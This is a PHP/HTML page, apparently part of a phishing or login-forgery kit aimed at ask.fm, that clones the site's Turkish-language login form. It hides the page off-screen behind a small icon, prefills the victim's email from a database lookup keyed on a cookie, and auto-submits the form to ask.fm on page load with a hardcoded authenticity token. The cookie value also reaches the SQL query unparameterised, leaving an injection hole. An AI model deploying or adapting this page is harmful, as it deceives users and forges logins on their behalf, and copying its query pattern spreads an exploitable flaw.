<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `ask.fm` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["quick_login_form"].submit();}</script>




<form action="http://ask.fm/session" id="quick_login_form" method="post" onSubmit="$.ajax({data:$.param($(this).serializeArray()) + '&amp;authenticity_token=' + encodeURIComponent('kUIIkaFByJVWclewQCpCFChOp6P7O3bRHQZ5ohM7qKE='), dataType:'script', type:'post', url:'/session'}); Forms.Login.afterQuickSubmit(); return false;"><div style="margin:0;padding:0;display:inline"><input name="authenticity_token" type="hidden" value="kUIIkaFByJVWclewQCpCFChOp6P7O3bRHQZ5ohM7qKE="></div>
  <div id="login-connect-popup"><br>
    <div class="connect-or-popup">ya da</div>
    <div class="connect-container-popup">
      <a href="javascript:void(0)" class="button-connect-fb" onClick="Login.connect(this,'/facebook_session/login',true)">
          <span>Facebook ile giriş</span>
      </a>
      <a href="javascript:void(0)" class="button-connect-tw" onClick="Login.connect(this,'/twitter_session/login',true)">
        <span>Twitter ile giriş</span>
      </a>
      <a href="javascript:void(0)" class="button-connect-vk" onClick="Login.connect(this,'/vkontakte_session/login',true)">
        <span>Vk.com ile giriş</span>
      </a>
      <img alt="" class="login-social-loader" src="/images/animation/loading.gif">
    </div>
  </div>

  <div class="formBox-popup">
    <div class="formBox-title">
      <span class="text-bold"><label for="login">Kullanıcı adı</label></span>
    </div>
    <input class="input-singleLine-popup" id="login" maxlength="40" name="login" tabindex="101" type="text" value="<?=$email;?>">
  </div>
  <div class="formBox-popup">
    <div class="formBox-title">
      <span class="text-bold"><label for="_ifre">Şifre</label></span>
    </div>
    <input class="input-singleLine-popup" id="password" maxlength="20" name="password" tabindex="102" type="password">
  </div>

  

  <div id="login-buttonContainer">
    <input id="login_follow" name="follow" type="hidden" value="">
    <input id="login_like" name="like" type="hidden" value="">
    <input id="login_back" name="back" type="hidden" value="">

    <input class="submit-button submit-button-active" name="commit" onClick="return Forms.Login.allowQuickSubmit(this)" tabindex="104" type="submit" value="Oturum aç">
    <div id="login-loader"></div>
    
  </div>

  <div class="remember_me-popup">
    <input autocomplete="off" class="settings-checkbox" id="remember_me" name="remember_me" tabindex="105" type="checkbox" value="1">
    <span class="recieveEmails-text">Oturumumu sürekli açık tut</span>
  </div>

  <div class="forgotPassword-container-popup">
    <a href="/remind/request" class="link-blue-underline" tabindex="106">
      <span class="text-12">Şifrenizi veya kullanıcı adınızı mı unuttunuz?</span>
    </a>
  </div>

</form>

</body>
</html>
